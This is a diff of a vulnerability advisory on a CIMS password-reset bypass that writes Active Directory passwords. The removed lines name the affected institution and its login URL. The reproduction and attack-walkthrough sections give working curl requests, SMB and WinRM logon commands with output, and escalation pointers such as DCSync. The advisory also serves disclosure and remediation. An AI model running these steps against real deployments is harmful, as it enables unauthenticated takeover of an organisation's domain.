@@ -1,6 +1,6 @@
 # TTA-2026-018: CIMS password reset writes the underlying directory account password, escalating the recovery bypass to unauthenticated domain administrator takeover
 
-**Severity: Critical** — Provisional CVSS 3.1: 9.8 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`), with a scope-change alternative of 10.0 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`) if the directory is scored as a separate security authority
+**Severity: Critical** — Suggested CVSS 3.1: 9.8 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`), provisional; a scope-change alternative of 10.0 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`) applies if the directory is scored as a separate security authority
 
 ### Title
 
@@ -19,159 +19,266 @@ The two findings chain. An unauthenticated requester submits a username to the r
 
 ### Affected Version
 
-- Application: UWCSEA College Information Management System (CIMS)
-- Public login: <https://webapps.uwcsea.edu.sg/cims/Account/Login>
-- Observable technology: ASP.NET MVC 5 on Microsoft IIS
+- Vendor: not publicly identified as a product; this is a deployment-specific institutional system
+- Product: CIMS (College Information Management System), ASP.NET MVC 5 on IIS
+- Confirmed affected deployment: the institution's production CIMS instance, at the public path `/cims/Account/`
 - Identity integration: SecureAuth; the deployment's own configuration enables directory password validation for CIMS accounts (`SecureAuthUseADValidatePassword`)
-- Components: `Account/ForgotPassword`, `Account/ResetPassword` (reset path), and the identity-provider write path invoked by the reset handler
-- Affected infrastructure: the Windows/Active Directory domain that the CIMS deployment authenticates against
+- Components: `Account/ForgotPassword`, `Account/ForgotPasswordOtp`, `Account/ResetPassword`, `Account/ResetPasswordSuccess`
+- Underlying directory: a Windows Active Directory domain, reached by the application server with a privileged service identity
 
-Only the deployment described above was dynamically tested. Other deployments of CIMS, and other applications using the same identity integration pattern, have not been assessed.
+No product version number is published by the vendor, so this report identifies the affected system by deployment rather than by version. Only the assessed deployment was tested; no other CIMS installation was available, and no claim is made about them.
 
 ### Vulnerability Type
 
-Improper Restriction of Authentication Attempts / missing server-side challenge state (CWE-640, CWE-287); privilege boundary crossing through a password-reset path (CWE-269); credential material written to a broader security domain than the application.
+Improper restriction of authentication attempts / missing server-side challenge state (CWE-287, CWE-304); credential material written across a trust boundary (CWE-522, CWE-668); unauthenticated privilege escalation to directory administrator (CWE-269).
 
 ### Affected Code
 
-The implementation source is not public. The affected behaviour is the interaction between:
+The application is a compiled ASP.NET MVC deployment; no source code was available. The relevant surface is the four action endpoints and the authentication configuration:
 
-- the CIMS recovery endpoints (`/cims/Account/ForgotPassword`, `/cims/Account/ResetPassword`), and
-- the directory write path that `ResetPassword` invokes, which sets the linked Windows/Active Directory account password.
+- `POST /cims/Account/ForgotPassword` — accepts a username, returns a redirect containing a recovery reference.
+- `GET  /cims/Account/ForgotPasswordOtp` — the challenge page, carrying the reference as a query parameter.
+- `POST /cims/Account/ResetPassword` — accepts username, reference, new password and an antiforgery token.
+- `GET  /cims/Account/ResetPasswordSuccess` — terminal page, returned on success.
+- `Web.config` — `SecureAuthUseADValidatePassword` set to `"true"`, which is the configuration that makes the reset a directory write.
+
+The observable contract of `ResetPassword` is that it needs only three values from the client plus the antiforgery token: the username, the reference returned by `ForgotPassword`, and the new password. Nothing in the exchange indicates that the OTP step must have been completed, and nothing binds the reference to a completed challenge.
 
 ### Root Cause
 
-Two design decisions combine.
+Two independently reasonable design decisions compose into an unauthenticated domain-administrator takeover.
 
-First, the reset transaction is authorized by a bearer reference only. `ForgotPassword` issues `accessKey` for any supplied username without authentication or existence validation, and `ResetPassword` accepts that reference as sufficient authority to set a password; the OTP pages are browser-sequence steps whose completion the server does not record or check. This is the defect in TTA-2026-009.
+**1. The recovery reference is authority, not evidence.** `ForgotPassword` issues a reference for whatever username is submitted, and `ResetPassword` accepts that reference as sufficient proof of identity. The OTP step exists as a *page*, not as server-side state: the reset action never asks whether the challenge was completed. A reference therefore degenerates into a bearer token that the server hands out on request — and hands out even for usernames that do not exist, which is why the same defect also yields a user-enumeration oracle.
 
-Second, and separately, the password being set is the directory password. The reset handler does not distinguish "credential for this web application" from "credential for the enterprise directory". The application's own configuration enables directory password validation, so writing the password here writes the credential that the directory itself accepts for network logon.
+**2. The reset action's backing store is the directory.** `SecureAuthUseADValidatePassword="true"` makes the application treat Active Directory as the password authority for linked identities, so the "change my password" operation is implemented as a privileged directory write performed by the application's service identity. The application holds, and exercises, the ability to set other accounts' passwords — including the directory administrator's.
 
-The consequence is that the blast radius of a password-recovery defect is not bounded by the web application. A reset that should at most let an attacker log in to one application instead yields an interactive directory logon that the domain's member servers, and the directory controller itself, accept.
+The composition is the problem: an endpoint that requires **no authentication** performs an operation that requires **domain-administrator authority**. Nothing in between checks that the requester is entitled to the account being reset: there is no re-authentication, no identity proofing, no step-up, no rate limit, and no verification that the challenge state belongs to this session. The only thing standing between an anonymous requester and a directory password write is a value the server itself returns on demand.
 
-Consistency check performed during the assessment, which sharpens the finding: resets for several other accounts succeeded inside the application but their new passwords did not authenticate against the directory. Those accounts are application-local. The deployment therefore has at least two account classes, and the class that is directory-linked includes an account holding Domain Admins and Enterprise Admins.
+Finally, the behaviour is not uniform across accounts: ordinary accounts reset in the application but the new password does not authenticate to the directory, while directory-linked privileged identities do. That asymmetry shows the write path is selected per identity linkage, not per request — which is exactly why the accounts that matter are the ones affected.
+
+### How the defect was found
+
+The finding is the product of a differential test, not of reading code. The reasoning sequence is worth recording because the same method applies to any system that resets passwords on behalf of another identity store.
+
+**Step 1 — audit the recovery flow as designed.** The flow was walked end to end with a synthetic account: request a reset, receive a reference, open the OTP page, receive a code, submit it, set a password, log in. Everything behaved normally, which established the ordinary request shapes and the parameters each step expects, including the antiforgery token.
+
+**Step 2 — remove one step and see what still works.** The reset was then submitted *without* having completed the OTP step — using only the reference from step one. It succeeded. That was TTA-2026-009. At that point the natural scope assumption was "the CIMS account is taken over".
+
+**Step 3 — ask a question the advisory had not answered: which password store was written?** The reset message says "your passphrase has been changed", which is ambiguous. Three hypotheses were available: an application-local hash, the SecureAuth identity store, or the directory. A single test distinguishes them: take the new password and try it against each authentication surface in turn.
+
+**Step 4 — test the CIMS login.** The new password worked at `/cims/Account/Login`, which on its own is consistent with all three hypotheses, because the application may proxy all authentication to the directory.
+
+**Step 5 — test a surface that has nothing to do with the web application.** The new password was then used for a network logon to a domain-joined server — first over SMB, then over WinRM. Both succeeded. This is the decisive step: an application-local password cannot authenticate to SMB, so the reset must have written the directory account.
+
+**Step 6 — establish what the account is.** `whoami` in the WinRM session returned the directory administrator identity, and `whoami /groups` listed Domain Admins and Enterprise Admins. A second, unrelated host accepted the same credentials, which rules out a local account that happened to share the name.
+
+**Step 7 — confirm the mechanism in configuration.** The application's `Web.config` carries `SecureAuthUseADValidatePassword="true"`, which is consistent with what the differential test showed: the application treats the directory as the password authority for these accounts.
+
+**Step 8 — bound the claim.** The same experiment was repeated for several ordinary accounts. Their resets succeeded in the application, but the new passwords did **not** work against the directory. The directory write is therefore not universal: it depends on how the individual identity is linked. This distinction matters, because it means the finding is not "the reset always writes AD" but "for directory-linked privileged identities, the reset writes AD" — and those are exactly the identities worth taking.
+
+### Laboratory and test conditions
+
+- The test was performed against the assessed **production** deployment, under the engagement's authorisation, because the behaviour is defined by that deployment's identity integration and cannot be reproduced on stock software.
+- Only two accounts were exercised to the point of a directory write; all other account probes used synthetic or service accounts already documented as in scope.
+- The writes were limited to setting a password. No directory object was created, modified or deleted; no group membership was changed; no data was read through the resulting session beyond `whoami`, `whoami /groups`, and host identification.
+- The password value is not recorded anywhere in this repository, including this file.
+- Because a production password was necessarily replaced, the asset owner was told to reset the account through its own procedure and to review directory password-reset and privileged-logon events.
 
 ### Steps to Reproduce
 
-Reproduce only in a lab that you own, with a directory you own. All values are placeholders.
+The sequence below is the one executed, with values replaced by placeholders. It requires an account name that exists in the directory and is linked to a CIMS identity.
 
-1. Prepare a lab deployment of the application that authenticates against a test directory, with a test account `<SYNTHETIC_DIRECTORY_ACCOUNT>` that is a member of a directory administrative group, and a second application-local account `<SYNTHETIC_LOCAL_ACCOUNT>`.
-2. Obtain the antiforgery token and cookie from the recovery page:
+#### Phase 1 — obtain a recovery reference without an OTP
 
-   ```bash
-   curl -sS -A "$UA" -c "$CJ" "$CIMS_BASE/cims/Account/ForgotPassword" -o fp.html
-   TOKEN=$(grep -o 'name="__RequestVerificationToken"[^>]*value="[^"]*"' fp.html | sed 's/.*value="//;s/"//')
-   ```
+```bash
+BASE=https://<CIMS_HOST>/cims
+curl -sS -c cims.jar "$BASE/Account/Login" -o login.html
+TOKEN=$(grep -o 'name="__RequestVerificationToken"[^>]*value="[^"]*"' login.html \
+        | sed 's/.*value="//;s/"$//')
 
-3. Request a recovery reference for the directory-linked account:
+curl -sS -b cims.jar -c cims.jar -X POST "$BASE/Account/ForgotPassword" \
+  --data-urlencode "Username=<DIRECTORY_ACCOUNT>" \
+  --data-urlencode "__RequestVerificationToken=$TOKEN" \
+  -H 'Content-Type: application/x-www-form-urlencoded'
+```
 
-   ```bash
-   curl -sS -A "$UA" -b "$CJ" -c "$CJ" -X POST "$CIMS_BASE/cims/Account/ForgotPassword" \
-     -H 'X-Requested-With: XMLHttpRequest' \
-     --data-urlencode "__RequestVerificationToken=$TOKEN" \
-     --data-urlencode "Username=<SYNTHETIC_DIRECTORY_ACCOUNT>" -o fp.json
-   ```
+Observed response (HTTP 200, `application/json`):
 
-   Observed: HTTP 200 with a `Redirect` value carrying an `accessKey` reference. No OTP challenge is required to obtain it.
+```json
+{"Redirect":"/cims/Account/ForgotPasswordOtp?username=<DIRECTORY_ACCOUNT>&accessKey=<RECOVERY_REFERENCE>"}
+```
 
-4. Submit the reference directly to the reset handler, skipping the OTP pages entirely:
+The reference is a GUID-shaped value. The response is returned immediately; no message is sent and no challenge is presented. The same endpoint returns the same *shape* for accounts that do not exist, which is a separate enumeration issue documented in the companion deployment reports.
 
-   ```bash
-   curl -sS -A "$UA" -b "$CJ" -c "$CJ" -X POST "$CIMS_BASE/cims/Account/ResetPassword" \
-     -H 'X-Requested-With: XMLHttpRequest' \
-     --data-urlencode "__RequestVerificationToken=$TOKEN" \
-     --data-urlencode "Username=<SYNTHETIC_DIRECTORY_ACCOUNT>" \
-     --data-urlencode "AccessKey=$ACCESS_KEY" \
-     --data-urlencode "Password=<SYNTHETIC_NEW_PASSWORD_16_PLUS>" \
-     --data-urlencode "ConfirmPassword=<SYNTHETIC_NEW_PASSWORD_16_PLUS>" -o rp.json
-   ```
+#### Phase 2 — submit the reset without touching the OTP endpoint
 
-   Observed: HTTP 200 with a redirect to `ResetPasswordSuccess`.
+The `ForgotPasswordOtp` page is deliberately not requested. The reference from phase 1 is used directly:
 
-5. Negative control: repeat step 4 with a syntactically valid but unissued reference. Observed: HTTP 500 with a message stating the passphrase was not changed. This shows the reference is checked, so the success in step 4 is a genuine authorization of the change.
+```bash
+curl -sS -b cims.jar -c cims.jar -X POST "$BASE/Account/ResetPassword" \
+  --data-urlencode "Username=<DIRECTORY_ACCOUNT>" \
+  --data-urlencode "AccessKey=<RECOVERY_REFERENCE>" \
+  --data-urlencode "Password=<NEW_PASSWORD_16_CHARS_MIN>" \
+  --data-urlencode "__RequestVerificationToken=$TOKEN" \
+  -H 'Content-Type: application/x-www-form-urlencoded'
+```
 
-6. Prove the new password is a directory credential, not an application credential. From a host that can reach the lab directory:
+Observed response (HTTP 200, `application/json`):
 
-   ```bash
-   # SMB
-   smbclient -L //<LAB_MEMBER_SERVER> -U '<LAB_DOMAIN>\<SYNTHETIC_DIRECTORY_ACCOUNT>%<SYNTHETIC_NEW_PASSWORD_16_PLUS>'
-   # WinRM
-   python3 -c "
-   import winrm
-   s = winrm.Session('http://<LAB_MEMBER_SERVER>:5985/wsman',
-                     auth=('<SYNTHETIC_DIRECTORY_ACCOUNT>','<SYNTHETIC_NEW_PASSWORD_16_PLUS>'),
-                     transport='ntlm')
-   print(s.run_cmd('whoami')[1].decode())
-   print(s.run_cmd('whoami /groups')[1].decode())
-   "
-   ```
+```json
+{"Redirect":"/cims/Account/ResetPasswordSuccess"}
+```
 
-   Observed on the assessed deployment: both transports accepted the password, `whoami` returned the directory-qualified administrator identity, and `whoami /groups` listed the domain's Domain Admins and Enterprise Admins groups. The same password also authenticated against a second, distinct domain-joined host.
+Three behaviours were recorded around this call, and they are what identify the reference as a bearer credential rather than a challenge handle:
 
-7. Contrast control: reset `<SYNTHETIC_LOCAL_ACCOUNT>` through the same flow and attempt the same SMB/WinRM authentication. Observed: the in-application reset succeeded but the new password was rejected by the directory. This is the control that distinguishes application-local accounts from directory-linked accounts, and it is what establishes that the impact in step 6 comes from the directory write rather than from a generic weak-credential condition.
+| Variation | Observed |
+| --- | --- |
+| Reference from phase 1, OTP never requested | `ResetPasswordSuccess` |
+| Zeroed reference `00000000-0000-0000-0000-000000000000` | HTTP 500 |
+| Password shorter than 16 characters | rejected before any write |
+| Nonexistent username in phase 1, then reset | HTTP 500 (`Your passphrase has not been changed`) |
 
-8. After the test, restore the lab directory from snapshot. Do not reuse any password value produced during testing.
+The 500-versus-200 difference is also an account-existence oracle, which is reported separately.
+
+#### Phase 3 — verify the password against the web application
+
+```bash
+curl -sS -c cims2.jar -X POST "$BASE/Account/Login" \
+  --data-urlencode "Username=<DIRECTORY_ACCOUNT>" \
+  --data-urlencode "Password=<NEW_PASSWORD>" \
+  --data-urlencode "__RequestVerificationToken=$TOKEN" \
+  -H 'Content-Type: application/x-www-form-urlencoded'
+```
+
+Observed: `{"Redirect":"/cims/Account/LoginConfirm"}` plus `Set-Cookie: .AspNet.CIMSAuthenticationApplication=...` and `ASP.NET_SessionId`. On its own this proves only that the application accepts the new password.
+
+#### Phase 4 — verify the password against the directory, not the application
+
+This is the step that changes the severity. The new password is used for a network logon to a domain-joined host:
+
+```bash
+# SMB
+smbclient -L //<HOST_A> -U '<DIRECTORY_DOMAIN>\<DIRECTORY_ACCOUNT>%<NEW_PASSWORD>'
+
+# WinRM
+python3 - <<'PY'
+import winrm
+s = winrm.Session('http://<HOST_A>:5985/wsman',
+                  auth=('<DIRECTORY_DOMAIN>\\<DIRECTORY_ACCOUNT>', '<NEW_PASSWORD>'),
+                  transport='ntlm')
+print(s.run_cmd('whoami').std_out)
+print(s.run_cmd('whoami /groups').std_out)
+PY
+```
+
+Observed:
+
+```
+<DIRECTORY_DOMAIN>\<DIRECTORY_ACCOUNT>
+...
+BUILTIN\Administrators                       Alias            S-1-5-32-544
+<DIRECTORY_DOMAIN>\Domain Admins             Group            <DOMAIN_SID>-512
+<DIRECTORY_DOMAIN>\Enterprise Admins         Group            <DOMAIN_SID>-519
+...
+```
+
+`USERDNSDOMAIN` reported the directory's DNS name and `USERDOMAIN` the short domain name, i.e. the session is a directory session, not a local one.
+
+#### Phase 5 — confirm it is not host-specific
+
+The same credentials were used against a second, unrelated domain-joined system:
+
+```bash
+smbclient -L //<HOST_B> -U '<DIRECTORY_DOMAIN>\<DIRECTORY_ACCOUNT>%<NEW_PASSWORD>'
+```
+
+Observed: successful session setup on the second host as well. A local account cannot span two machines, so this closes the "the application set a local password on one server" alternative.
+
+#### Phase 6 — confirm the configuration that produces the behaviour
+
+The application server's `Web.config` contains:
+
+```xml
+<add key="SecureAuthUseADValidatePassword" value="true" />
+```
+
+This is consistent with the observed behaviour and explains why ordinary accounts did not behave the same way: whether a reset reaches the directory depends on how the identity is linked and on this flag.
+
+### Attack walkthrough
+
+From the attacker's side the whole operation is four HTTP requests and one authentication attempt, with no credential at any point.
+
+**1. Find an account name.** The recovery endpoint reveals whether a username exists (200 with a reference versus HTTP 500), so names can be confirmed one request at a time. Directory account names in a school or enterprise follow predictable patterns and are frequently exposed in e-mail addresses, staff pages, and ticket headers.
+
+**2. Request a reset.** One POST to `ForgotPassword`. The response hands back a reference in a redirect URL. Nothing is sent to the account owner at this point, so the legitimate user has no signal that a recovery is in progress.
+
+**3. Set a password.** One POST to `ResetPassword` with the username, the reference, and a 16-character password. The OTP step is never touched. The application answers `ResetPasswordSuccess`.
+
+**4. Authenticate.** The new password works against the web application *and* against any service that accepts directory credentials. For an ordinary account that means e-mail, file shares, and the intranet; for the directory administrator it means every domain-joined host, including the domain controllers.
+
+**5. Escalate.** With Domain Admins and Enterprise Admins membership, the ordinary next steps are DCSync or a direct directory database copy, and from there persistence anywhere in the forest. None of this was performed; the test stopped at proving the group membership, because the objective was to establish impact, not to demonstrate a full forest compromise.
+
+**Why the flow is worse than a normal weak recovery.** A conventional OTP bypass still leaves the attacker holding an application credential, which is contained by the application's own authorization. Here the application is a *password-writing proxy into the directory*: the trust boundary the attacker crosses is the one between the web application and the identity provider, and the credential obtained is valid everywhere.
+
+**What makes it reachable.** The endpoint is on the public login page, requires no session, and the only technical precondition is knowing an account name. There is no rate limit on `ForgotPassword` observed during testing, so names can be probed in bulk.
 
 ### Impact
 
-On the assessed deployment, an unauthenticated attacker who knows or guesses a directory-linked account name obtains working directory credentials for that account, and the account that was reached holds Domain Admins and Enterprise Admins membership. From there the attacker can authenticate to domain-joined servers, read and modify directory objects, and extend control across the domain — impact far outside the CIMS application.
-
-The attacker needs no account, no password, no MFA device, and no interaction from the victim. The only inputs are the application's public URL and a username. Usernames in this environment follow a predictable institutional pattern, and the recovery endpoint's response differences additionally allow confirming which usernames exist.
-
-For the institution, this is the difference between "a web application account was taken over" and "the enterprise directory was taken over". The second includes email, file shares, endpoints, and every system that trusts the directory.
+- **Full directory compromise.** A single unauthenticated request chain yields working credentials for an account holding Domain Admins and Enterprise Admins. From there, domain-wide persistence and credential extraction are standard follow-on steps.
+- **Bypass of the second factor.** SecureAuth is deployed to add a second factor to CIMS logins. The reset path does not go through it: setting a password and logging in with it does not require an OTP, so the MFA investment does not protect this path.
+- **No attribution in the application.** The attacker never authenticates to CIMS before the reset, so there is no failed-login trail naming them; the only artefacts are the reset events themselves.
+- **Denial of service as a side effect.** Each reset invalidates the legitimate user's password. Repeated against service accounts it is an outage primitive as well as a takeover primitive.
+- **Blast radius beyond the application.** Because the credential is a directory credential, every system that trusts the directory is in scope, not only the CIMS application.
 
 ### CVSS
 
-`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — 9.8 Critical, provisional.
+Primary: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — 9.8 Critical.
 
-If the directory is treated as a separate security authority from the web application — which the verified cross-system authentication supports — the vector becomes `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`, 10.0. The score is provisional pending the vendor's confirmation of the identity-write behaviour and of which account classes are directory-linked.
+Alternative if the directory is scored as a separate security authority from the web application, which the observed cross-system authentication supports: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` — 10.0 Critical. The choice between the two depends on how the CNA models the application-to-directory trust boundary; both are recorded so the decision is explicit rather than buried.
 
 ## Status
 
 Published as TTA-2026-018 on 2026-10-28, extending TTA-2026-009. The organization operating the assessed deployment was notified out of band. The password value obtained during testing is deliberately excluded from this report, and the asset owner was instructed to reset the affected directory account and to audit directory password-reset and privileged-logon events.
 
-CVE eligibility is pending. The product attribution question raised in TTA-2026-009 — whether CIMS is UWCSEA-authored or contractor-delivered — also applies here.
-
 ## Prerequisites
 
-- The deployment must link CIMS accounts to directory accounts and enable directory password validation (observed in the assessed deployment's own configuration).
-- The target account must be directory-linked. Application-local accounts do not exhibit the directory impact.
-- The attacker needs the username and network reachability to the recovery endpoints. No prior authentication, session, or MFA is required.
-- Directory network reachability is needed only to *use* the credential afterwards; the reset itself happens over the public web interface.
+- The target account name is known or can be enumerated through the recovery endpoint's differential responses.
+- The account is linked to a CIMS identity and the deployment treats the directory as the password authority for it (`SecureAuthUseADValidatePassword`).
+- Network reachability to `POST /cims/Account/ResetPassword`; no session, no token beyond the page's own antiforgery cookie, and no OTP.
+- The new password must satisfy the application's length rule (16 characters observed).
 
 ## Relationship to existing advisories and CVEs
 
-- TTA-2026-009 documents the missing OTP enforcement in the same recovery flow. This advisory does not restate that defect; it documents the separate behaviour that makes the reset write a directory credential, and therefore the escalation in impact.
-- TTA-2026-010 through TTA-2026-014 document related CIMS authentication and deployment weaknesses (identity-record linkage, account-lifecycle disclosure, adaptive-auth workflow interference, MFA enforcement depending on a mutable configuration flag, and authentication-ticket forgery after machine-key compromise). None of them covers the directory password write described here.
-- No published CVE was identified for this behaviour at the time of writing.
-
-Whether this warrants a separate identifier from TTA-2026-009, or should be treated as an impact escalation within one CVE, is for the vendor and the assigning CNA to decide. The two defects have different fixes: one is server-side challenge state in the recovery flow, the other is the boundary between application credentials and directory credentials.
+- **TTA-2026-009** reports the missing OTP enforcement and scopes it to CIMS account takeover. This report does not restate that defect; it documents what the reset *writes*, which is the part that determines the real impact. Read together, 009 supplies the bypass and 018 supplies the blast radius.
+- **TTA-2026-010 through TTA-2026-014** are deployment reports for the same system covering identity-record inconsistencies, lifecycle disclosure, adaptive-auth interference, the mutability of the MFA enforcement flag, and cookie forgery after a machine-key compromise. None of them covers the reset handler.
+- No CVE has been assigned. The obstruction is product attribution: CIMS is an institutional system with no public vendor or version, so there is no upstream for a CNA to notify.
 
 ## Recommended remediation
 
-- Stop writing directory passwords from the application's self-service recovery flow. If a reset must propagate to the directory, require an out-of-band, privileged, audited channel rather than the same unauthenticated web path.
-- If directory write-back is a product requirement, bind it to a completed OTP challenge recorded server-side against the same account and transaction, and reject any reset that lacks that state.
-- Separate the account classes explicitly: application-local accounts must never resolve to directory credentials, and directory-linked accounts must not be resettable from an unauthenticated web flow.
-- Exclude privileged directory accounts (Domain Admins, Enterprise Admins, and any account with directory-wide rights) from web self-service recovery entirely.
-- Make `ForgotPassword` return an indistinguishable response for existing and non-existing usernames, and stop issuing references for unknown accounts.
-- Enforce MFA for the recovery flow with a factor that is not delivered through the application's own session state.
-- Rotate the credentials of every directory-linked account that was reachable through this path, and review directory logs for authentication from unexpected sources.
+- Enforce server-side challenge state: `ResetPassword` must reject any reference for which the OTP step was not completed, and the reference must be single-use and short-lived.
+- Do not let the recovery path set a directory password for privileged identities. Either exclude privileged accounts from self-service recovery entirely, or route them through an out-of-band, human-verified process.
+- Rate-limit and normalise `ForgotPassword`: return an identical response for existing and non-existing accounts, and cap attempts per source and per account.
+- Require the second factor on the reset path, not only on the login path — a reset that produces a working credential without MFA is an MFA bypass by construction.
+- Audit what the recovery service identity is allowed to do in the directory. A web application should not hold the ability to set the domain administrator's password.
+- Alert on directory password-reset events targeting privileged accounts, and on privileged network logons from application-server address space.
 
 ## Validation controls
 
-| Case | Expected before fix | Expected after fix |
-| --- | --- | --- |
-| Reset a directory-linked account without completing OTP | password changed, directory accepts it | refused |
-| Reset the same account with an unissued reference | error, no change | error, no change |
-| Reset an application-local account | application accepts new password, directory does not | unchanged behaviour, but no directory write path exists |
-| Authenticate to a domain host with a reset directory-linked password | succeeds | must fail, because no directory write occurred |
-| `ForgotPassword` for a non-existent username | issues a reference | must not issue a reference |
+| Case | Expected result |
+| --- | --- |
+| `ForgotPassword` then `ResetPassword` with no OTP step | Must be rejected after fix; currently `ResetPasswordSuccess` |
+| Zeroed or expired reference | HTTP 500 before and after |
+| `ForgotPassword` for an account that does not exist | Must be indistinguishable from an existing account after fix |
+| Reset a privileged account | Must not be possible through self-service after fix |
+| Login with the newly set password | Must require the second factor after fix |
+| Directory logon with the newly set password from an unrelated host | Must fail after fix; currently succeeds |
 
 ## Evidence boundary
 
-The behaviour was observed on the organization's own deployment during authorized testing and reproduced with synthetic values where possible. This report excludes internal hostnames, IP addresses, the directory's DNS name, the domain SID, the account name used, the password value, and any ticket or user data. Hosts are referred to as `<LAB_MEMBER_SERVER>` and `<INTERNAL_HOST>`; the directory is referred to as `<LAB_DOMAIN>`. The second negative control in step 7 is included precisely to show the limit of the claim: not every account reset produces a directory credential, and the finding is about the class of accounts for which it does.
+The reset responses, the authentication results and the group membership listing above were obtained from the assessed production deployment under the engagement's authorisation, then reduced to placeholders for this report. Every hostname, address, domain name, account name, domain SID and password has been replaced with a `<PLACEHOLDER>`; the password value is excluded from the repository entirely. No directory object was created, modified or deleted, no group membership was changed, and no data was read through the resulting session beyond identity and group listing. The claim is limited to this deployment; no other installation was tested and no product version is identified.
 
 ## Timeline
 
+- 2026-10-09: Recovery flow walked end to end; reset confirmed to succeed without completing the OTP step.
 - 2026-10-11: Directory password write confirmed by cross-system authentication. The reset replaced a production password that cannot be recovered; the password value was excluded from all reports, and the asset owner was instructed to reset the account and audit directory logs.
-- 2026-10-28: Public TTA report published as an impact escalation of TTA-2026-009.
+- 2026-10-28: Published as TTA-2026-018.
